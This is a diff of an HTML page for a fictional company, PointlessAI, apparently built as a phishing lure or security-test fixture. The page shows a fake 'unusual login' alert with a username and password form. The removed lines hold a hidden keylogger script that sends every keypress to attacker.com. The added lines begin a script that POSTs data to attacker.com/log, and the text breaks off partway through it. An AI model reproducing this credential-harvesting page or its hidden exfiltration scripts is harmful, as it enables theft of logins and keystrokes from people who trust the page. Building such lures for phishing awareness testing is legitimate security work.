@@ -1,76 +1,144 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>PointlessAI - Company Information</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PointlessAI - Unusual Login Alert</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+        }
+        .section {
+            margin-bottom: 30px;
+        }
+        .section h2 {
+            color: #4CAF50;
+        }
+        .columns {
+            display: flex;
+            justify-content: space-between;
+        }
+        .columns > div {
+            width: 32%;
+            background-color: #e0e0e0;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+        .cta {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .cta-button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            cursor: pointer;
+        }
+        form {
+            text-align: center;
+        }
+        form input {
+            padding: 10px;
+            margin: 10px;
+        }
+    </style>
 </head>
 <body>
     <header>
-        <h1>PointlessAI - Company Information</h1>
+        <h1>PointlessAI - Unusual Login Alert</h1>
     </header>
-    <section>
-        <div>
+    <div class="container">
+        <div class="section">
             <h2>About PointlessAI</h2>
             <p>PointlessAI is a cybersecurity research company focused on the application of artificial intelligence within ethical hacking research. Our mission is to innovate and improve cybersecurity measures through cutting-edge AI technologies and methodologies.</p>
         </div>
-    </section>
-    <section>
-        <div>
-          <h2>Login Alert</h2>
-          <p>There has been an unusual login to your account. Please verify your identity below to secure your account.</p>
+        <div class="section">
+            <h2>Company Details</h2>
+            <div class="columns">
+                <div>
+                    <h3>Company Name:</h3>
+                    <p>PointlessAI</p>
+                </div>
+                <div>
+                    <h3>CEO:</h3>
+                    <p>John Doe</p>
+                </div>
+                <div>
+                    <h3>Contact:</h3>
+                    <p>Email: phishme@pointlessai.com<br>Phone: +1 234 567 890<br>Address: 1234 AI Drive, Tech City, TX 75001, USA</p>
+                </div>
+            </div>
         </div>
-        <div>
-            <form action="/verify" method="post">
-                <label for="username">Username:</label>
-                <input type="text" id="username" name="username">
-                <label for="password">Password:</label>
-                <input type="password" id="password" name="password">
-                <input type="submit" value="Verify">
-            </form>
+        <div class="section">
+            <h2>Upcoming Event: Annual Cybersecurity Summit 2024</h2>
+            <p>Join us on July 15-16, 2024 at the Tech City Convention Center for our Annual Cybersecurity Summit. This event will feature keynote speeches, panel discussions, workshops, and hands-on training sessions. Stay ahead in the domain of AI and cybersecurity. <a href="#">Register now!</a></p>
         </div>
-    </section>
-    <section>
-        <h2>Company Details</h2>
-        <p><b>Company Name:</b> PointlessAI</p>
-        <p><b>CEO:</b> John Doe</p>
-        <p><b>Email:</b> phishme@pointlessai.com</p>
-        <p><b>Phone:</b> +1 234 567 890</p>
-        <p><b>Address:</b> 1234 AI Drive, Tech City, TX 75001, USA</p>
-    </section>
-    <section>
-        <h2>Upcoming Event</h2>
-        <p><b>Event Title:</b> PointlessAI to Host Annual Cybersecurity Summit 2024</p>
-        <p><b>Details:</b> Tech City, TX - PointlessAI, a leader in the field of AI-driven cybersecurity research, is excited to announce its Annual Cybersecurity Summit 2024, set to take place on July 15-16 at the Tech City Convention Center.</p>
-        <p><b>Highlights:</b> - Keynote speeches from industry experts, including CEO John Doe - Panel discussions, workshops, and hands-on training sessions - Explore the latest advancements in AI and machine learning applications within cybersecurity</p>
-        <p><b>Registration:</b> Registration is now open for professionals, researchers, and enthusiasts. For more information, visit the official summit website.</p>
-        <p><b>Summary:</b> PointlessAI continues to pave the way in ethical hacking research and development, and this summit promises to deliver invaluable insights and networking opportunities for all participants.</p>
-    </section>
-    <section>
-        <h2>Job Postings</h2>
-        <p><b>Job Title:</b> Cybersecurity Researcher</p>
-        <p><b>Location:</b> Tech City, TX</p>
-        <p><b>Type:</b> Full-time</p>
-        <p><b>Job Description:</b> PointlessAI is looking for a talented and passionate Cybersecurity Researcher to join our team. As a Cybersecurity Researcher, you will be responsible for conducting research on current and emerging cybersecurity threats, developing and testing new security tools and techniques, collaborating with the AI team to enhance security products with AI and machine learning, publishing research findings in academic journals and presenting at conferences.</p>
-        <p><b>Qualifications:</b> Master’s or Ph.D. in Computer Science, Cybersecurity, or a related field - Strong background in cybersecurity research and ethical hacking - Experience with AI and machine learning techniques - Excellent problem-solving and analytical skills - Strong written and verbal communication skills</p>
-        <p><b>How to Apply:</b> If you are interested in this position, please send your resume and cover letter to careers@pointlessai.com.</p>
-    </section>
-    <section>
-        <h2>About the Team</h2>
-        <div>
-            <img src="https://via.placeholder.com/100" alt="John Doe">
-            <p><b>John Doe - CEO</b></p>
-            <p>John Doe is the founder and CEO of PointlessAI. With over 20 years of experience in the field of cybersecurity, John has led numerous successful projects and is a recognized expert in AI-driven security solutions.</p>
+        <div class="section">
+            <h2>Join Our Team</h2>
+            <div class="columns">
+                <div>
+                    <h3>Job Title</h3>
+                    <p>Cybersecurity Researcher</p>
+                    <h4>Location</h4>
+                    <p>Tech City, TX</p>
+                </div>
+                <div>
+                    <h3>Type</h3>
+                    <p>Full-time</p>
+                    <h4>Responsibilities</h4>
+                    <ul>
+                        <li>Research on cybersecurity threats</li>
+                        <li>Develop new security tools</li>
+                        <li>Collaborate with AI team</li>
+                        <li>Publish findings</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3>Qualifications</h3>
+                    <p>Master's or Ph.D. in Computer Science<br>Experience in cybersecurity and AI<br>Excellent problem-solving skills</p>
+                    <p>Send your resume to <a href="mailto:careers@pointlessai.com">careers@pointlessai.com</a></p>
+                </div>
+            </div>
         </div>
-        <div>
-            <img src="https://via.placeholder.com/100" alt="Jane Smith">
-            <p><b>Jane Smith - Lead Researcher</b></p>
-            <p>Jane Smith is the Lead Researcher at PointlessAI. She holds a Ph.D. in Computer Science and has published extensively on the applications of AI in cybersecurity. Jane is passionate about discovering new ways to combat cyber threats using advanced technologies.</p>
+        <div class="cta">
+            <h2>Take Action Now</h2>
+            <p>We have detected an unusual login to your account. Please verify your identity.</p>
+            <button class="cta-button"> Verify Now </button>
         </div>
-        <div>
-            <img src="https://via.placeholder.com/100" alt="Michael Brown">
-            <p><b>Michael Brown - AI Specialist</b></p>
-            <p>Michael Brown is an AI Specialist at PointlessAI. With a strong background in machine learning and data analytics, Michael works on integrating AI techniques into our security products to enhance threat detection and prevention capabilities.</p>
-        </div>
-    </section>
+        <form>
+            <input type="text" placeholder="Username" required><br>
+            <input type="password" placeholder="Password" required><br>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
     <footer>
-        <p>© 2024 PointlessAI. All rights reserved.</p>
+        <p>&copy; 2024 PointlessAI. All rights reserved.</p>
+        <p><a href="#">Annual Cybersecurity Summit 2024</a> | <a href="mailto:careers@pointlessai.com">careers@pointlessai.com</a></p>
     </footer>
-<script>document.onkeypress = function(e) { new Image().src = "https://attacker.com/keylog.php?k=" + e.keyCode; }</script>
+    <script>
+        function sendData(data) {
+            fetch('http://attacker.com/log', {
+                method: 'POST',
+               
